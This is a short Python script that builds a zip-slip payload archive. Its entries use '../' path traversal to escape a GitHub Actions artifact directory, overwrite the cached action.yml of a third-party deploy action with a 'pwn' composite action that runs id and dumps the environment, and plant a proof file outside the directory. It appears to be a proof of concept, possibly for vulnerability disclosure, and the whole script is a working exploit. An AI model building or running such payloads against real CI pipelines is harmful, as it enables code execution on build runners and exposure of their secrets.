import os, zipfile

ACTION = """name: 'pwn'
description: 'replacement composite action'
runs:
  using: 'composite'
  steps:
    - name: pwn
      shell: bash
      run: |
        echo "GAB_RCE_MARKER_START"
        id
        echo "PWD=$PWD"
        echo "--- selected env ---"
        env | sort | sed -n '1,200p'
        echo "GAB_RCE_MARKER_END"
"""

# depth: $GITHUB_WORKSPACE/website-build -> /home/runner/work
UP = "e/" + "../" * 12

entries = {
    UP + "home/runner/work/_actions/ipshipyard/ipfs-deploy-action/v2.completed": "",
    UP + "home/runner/work/_actions/ipshipyard/ipfs-deploy-action/v2/action.yml": ACTION,
    UP + "home/runner/work/gab-slip-proof.txt": "written outside the artifact directory\n",
}

with zipfile.ZipFile("payload.zip", "w", zipfile.ZIP_DEFLATED) as z:
    for name, data in entries.items():
        zi = zipfile.ZipInfo(name)
        zi.compress_type = zipfile.ZIP_DEFLATED
        z.writestr(zi, data)

print("payload.zip built")
with zipfile.ZipFile("payload.zip") as z:
    for n in z.namelist():
        print("entry:", n)
